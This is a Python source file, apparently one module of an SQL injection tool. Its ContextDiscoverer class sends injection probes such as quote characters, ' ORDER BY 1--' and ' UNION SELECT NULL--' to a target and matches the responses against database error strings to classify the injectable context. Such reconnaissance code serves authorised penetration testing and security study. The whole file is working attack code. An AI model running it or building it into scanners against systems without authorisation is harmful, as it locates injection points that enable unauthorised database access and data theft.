import random
import re

class ContextDiscoverer:
    def __init__(self, client):
        self.client = client
        self.probes = [
            {"name": "single_quote", "payload": "'", "weight": 1.0},
            {"name": "double_quote", "payload": "\"", "weight": 1.0},
            {"name": "bracket_single", "payload": "')", "weight": 1.0},
            {"name": "bracket_double", "payload": "\")", "weight": 1.0},
            {"name": "order_by", "payload": " ORDER BY 1--", "weight": 1.0},
            {"name": "union_probe", "payload": " UNION SELECT NULL--", "weight": 1.0},
        ]
        self.detected_context = "UNKNOWN"

    def discover(self):
        print("[*] Phase: Context Discovery (The Eye) active.", flush=True)
        results = {}
        
        for probe in self.probes:
            print(f"  [?] Probing: {probe['name']}...", flush=True)
            response = self.client.send_request(probe['payload'])
            results[probe['name']] = {
                "status": response['status'],
                "length": len(response['text']),
                "has_error": self._check_sql_errors(response['text'])
            }

        # Analysis Logic
        if results["single_quote"]["has_error"] or results["bracket_single"]["has_error"]:
            self.detected_context = "SINGLE_QUOTE"
        elif results["double_quote"]["has_error"] or results["bracket_double"]["has_error"]:
            self.detected_context = "DOUBLE_QUOTE"
        elif results["union_probe"]["status"] == 200:
            self.detected_context = "UNION_FRIENDLY"
        else:
            self.detected_context = "GENERIC"

        print(f"[+] Discovery Complete. Detected Context: {self.detected_context}", flush=True)
        return self.detected_context

    def _check_sql_errors(self, text):
        error_patterns = [
            r"SQL syntax", r"mysql_fetch", r"ORA-", r"PostgreSQL", r"SQLite", r"syntax error"
        ]
        for pattern in error_patterns:
            if re.search(pattern, text, re.IGNORECASE):
                return True
        return False
